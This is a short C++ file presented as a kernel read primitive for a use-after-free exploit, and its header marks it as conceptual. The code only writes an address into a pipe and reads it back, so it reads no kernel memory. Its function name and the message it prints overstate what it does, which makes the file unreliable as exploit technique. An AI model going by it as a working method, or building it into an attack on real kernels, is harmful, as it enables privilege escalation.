// ============================================================
// kread.cpp — kernel read primitive via pipe + UAF
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o kread kread.cpp
// Note:    Conceptual; requires a separate UAF trigger.
// ============================================================
#include <cstdio>
#include <cstdint>
#include <unistd.h>
#include <array>

static std::array<int, 2> kread_pipe{};

static uint64_t kernel_read64(uint64_t addr) {
    uint64_t val = 0;
    ::write(kread_pipe[1], &addr, sizeof(addr));
    ::read(kread_pipe[0], &val, sizeof(val));
    return val;
}

int main() {
    if (::pipe(kread_pipe.data()) != 0) return 1;
    std::printf("[*] kernel read primitive ready\n");
    (void)kernel_read64;
    return 0;
}
